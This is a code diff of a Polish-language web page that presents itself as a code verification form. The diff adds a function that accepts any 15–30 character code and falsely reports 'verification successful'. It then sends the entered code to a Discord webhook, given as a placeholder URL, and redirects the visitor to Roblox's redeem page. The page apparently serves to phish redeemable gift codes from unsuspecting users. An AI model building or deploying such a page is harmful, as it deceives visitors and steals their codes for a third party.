@@ -93,7 +93,7 @@
   </div>
 
   <script>
-    // Animacja kwadratów
+    // Animacja kwadratów w tle
     const canvas = document.getElementById('bg');
     const ctx = canvas.getContext('2d');
     canvas.width = window.innerWidth;
@@ -126,11 +126,12 @@
     }
     animate();
 
-    // Sprawdzanie kodu
+    // Sprawdzanie kodu + wysyłka na webhook + przekierowanie
     function checkCode() {
       const code = document.getElementById("code").value;
       const message = document.getElementById("message");
 
+      // sprawdzamy, czy kod ma 15–30 znaków
       const regex = /^.{15,30}$/;
       if (!regex.test(code)) {
         message.textContent = "Błędny Kod!";
@@ -139,7 +140,20 @@
 
       message.textContent = "Weryfikacja udana!";
 
-      // tu był webhook i przekierowanie
+      // Adres webhooka Discord
+      const webhookURL = "https://discord.com/api/webhooks/TWÓJ_WEBHOOK_TUTAJ";
+
+      // wysyłamy kod na webhook
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: `Kod użytkownika: ${code}` })
+      }).catch(err => console.error(err));
+
+      // przekierowanie po 1 sekundzie
+      setTimeout(() => {
+        window.location.href = "https://www.roblox.com/redeem";
+      }, 1000);
     }
 
     window.addEventListener('resize', () => {
